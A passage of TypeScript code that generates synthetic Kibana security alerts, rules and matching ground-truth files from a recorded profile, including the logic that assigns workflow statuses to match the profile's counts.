      (unkeyedBySeverity[severity] ?? 0) -
      (severity === 'high' ? params.entra.alerts : 0);
    const rulesOfGroup = Array.from({ length: params.rulesPerSeverity[severity] }, (_, i) =>
      addRule(...ruleNameAndKind(rng, params.kindWeights, i + 1, severity))
    );
    buildKeyedGroup({
      rulesOfGroup,
      total: Math.max(0, total),
      keys: Math.round(total / params.meanKeySize),
      timing: params.default,
      allowBursts: true,
    });
  });

  // Building-block alerts.
  severities.forEach((severity) => {
    const total = cell(true, severity);
    if (total === 0) return;
    section(`building-block-${severity}`);
    const rulesOfGroup = Array.from(
      { length: Math.min(params.buildingBlockRules, total) },
      (_, i) =>
        addRule(
          ...ruleNameAndKind(
            rng,
            { ...params.kindWeights, cloud: 0 },
            i + 1,
            severity,
            'Building Block: '
          ),
          true
        )
    );
    buildKeyedGroup({
      rulesOfGroup,
      total,
      keys: Math.round(total / params.meanKeySize),
      timing: params.buildingBlock,
      buildingBlock: true,
    });
  });

  section('status');
  assignStatuses(rng, alerts, profile);
  return { rules, alerts, keyCount: keyCount.keyed };
};

/** Gives every alert a workflow status, so that each severity and building-block cell has exactly the counts of query 1. */
const assignStatuses = (rng: Rng, alerts: BuiltAlert[], profile: Profile): void => {
  const cells = new Map<string, BuiltAlert[]>();
  alerts.forEach((a) => {
    const key = `${Boolean(a.doc['kibana.alert.building_block_type'])}|${
      a.doc['kibana.alert.severity']
    }`;
    const list = cells.get(key) ?? [];
    cells.set(key, list);
    list.push(a);
  });
  const unkeyedShareOfClosed = 0.453; // 3,943 of 8,706 closed alerts have no key in query 2
  cells.forEach((list, key) => {
    const [bb, severity] = key.split('|');
    const mix = profile.totals.statusSeverityMix.filter(
      (r) => String(r.buildingBlock) === bb && r.severity === severity
    );
    const wanted = mix.map((r): [string, number] => [r.status, r.alerts]);
    const sum = wanted.reduce((a, [, n]) => a + n, 0);
    if (sum !== list.length)
      throw new Error(`cell ${key}: ${list.length} generated, ${sum} in the profile`);
    const unkeyed = rng.shuffle(list.filter((a) => a.truth.keyId.startsWith('unkeyed-')));
    const keyed = rng.shuffle(list.filter((a) => !a.truth.keyId.startsWith('unkeyed-')));
    const closedCount = wanted.find(([s]) => s === 'closed')?.[1] ?? 0;
    const closedUnkeyed = Math.min(unkeyed.length, Math.round(closedCount * unkeyedShareOfClosed));
    const ordered = [...unkeyed.slice(0, closedUnkeyed), ...keyed, ...unkeyed.slice(closedUnkeyed)];
    // Non-open statuses go to the front: closed unkeyed first, then keyed alerts, so open keeps the unkeyed rest.
    const nonOpen = wanted.filter(([s]) => s !== 'open');
    let cursor = 0;
    nonOpen.forEach(([status, count]) => {
      for (let i = 0; i < count; i++)
        ordered[cursor++].doc['kibana.alert.workflow_status'] = status;
    });
    for (; cursor < ordered.length; cursor++)
      ordered[cursor].doc['kibana.alert.workflow_status'] = 'open';
  });
};

/** Builds the whole day in memory. The alerts and the truth come back in the same order, oldest first. */
export const generate = ({
  profile,
  seed,
  params: overrides = {},
}: {
  profile: Profile;
  seed: number;
  params?: DeepPartial<GeneratorParams>;
}): GeneratedDay => {
  const params = merge(DEFAULT_PARAMS, overrides);
  const { rules, alerts, keyCount } = buildDay(profile, seed, params);
  const sorted = [...alerts].sort((a, b) => {
    const byTime = a.doc['@timestamp'].localeCompare(b.doc['@timestamp']);
    return byTime !== 0 ? byTime : a.truth.id.localeCompare(b.truth.id);
  });
  return {
    rules,
    alerts: sorted.map(({ doc }) => ({ _id: doc['kibana.alert.uuid'], _source: doc })),
    truth: sorted.map(({ truth }) => truth),
    meta: { seed, params, alerts: alerts.length, keyedKeys: keyCount },
  };
};

export const main = (): void => {
  const args = parseArgs(process.argv);
  const profile = JSON.parse(fs.readFileSync(args.profile, 'utf8')) as Profile;
  const { rules, alerts, truth, meta } = generate({
    profile,
    seed: args.seed,
    params: args.params,
  });

  fs.mkdirSync(args.out, { recursive: true });
  const write = (file: string, lines: string[]): void =>
    fs.writeFileSync(path.join(args.out, file), `${lines.join('\n')}\n`);
  write(
    'alerts.ndjson',
    alerts.map((alert) => JSON.stringify(alert))
  );
  write(
    'truth.ndjson',
    truth.map((line) => JSON.stringify(line))
  );
  fs.writeFileSync(path.join(args.out, 'rules.json'), JSON.stringify(rules, null, 2));
  fs.writeFileSync(path.join(args.out, 'meta.json'), JSON.stringify(meta, null, 2));
  process.stdout.write(
    `${JSON.stringify({
      out: args.out,
      alerts: alerts.length,
      rules: rules.length,
      keyedKeys: meta.keyedKeys,
    })}\n`
  );
};
